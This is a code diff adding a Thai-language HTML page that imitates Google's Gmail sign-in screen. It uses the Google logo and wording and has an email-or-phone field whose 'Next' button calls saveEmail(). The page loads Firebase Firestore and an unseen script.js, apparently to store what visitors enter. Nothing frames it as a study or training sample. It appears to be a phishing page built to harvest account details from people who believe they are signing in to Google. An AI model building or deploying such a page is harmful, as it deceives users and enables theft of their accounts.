@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>เข้าสู่ระบบ</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #edf2f7;
+            margin: 0;
+        }
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 900px;
+            text-align: left;
+        }
+        .google-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin: 0;
+            font-weight: 500;
+        }
+        .description {
+            font-size: 14px;
+            color: #555;
+            margin: 15px 0;
+        }
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 10px;
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .register-btn {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 5px;
+        }
+        .register-btn:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .next-btn:hover {
+            background: #1669c1;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+        <h2>ลงชื่อเข้าใช้</h2>
+        <p class="description">ด้วยบัญชี Google เพื่อไปยัง Gmail บัญชีนี้จะพร้อมใช้งานกับแอปอื่นๆ ของ Google ในเบราว์เซอร์</p>
+        
+        <!-- ฟอร์มรับอีเมล -->
+        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์" required>
+        <a href="#" class="forgot-link">หากลืมอีเมล</a>
+        
+        <div class="actions">
+            <button type="button" class="register-btn">สร้างบัญชี</button>
+            <button type="button" class="next-btn" onclick="saveEmail()">ถัดไป</button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK (ใช้ compat version) -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
+<!-- โหลด script.js หลังจาก Firebase SDK -->
+<script src="script.js"></script>
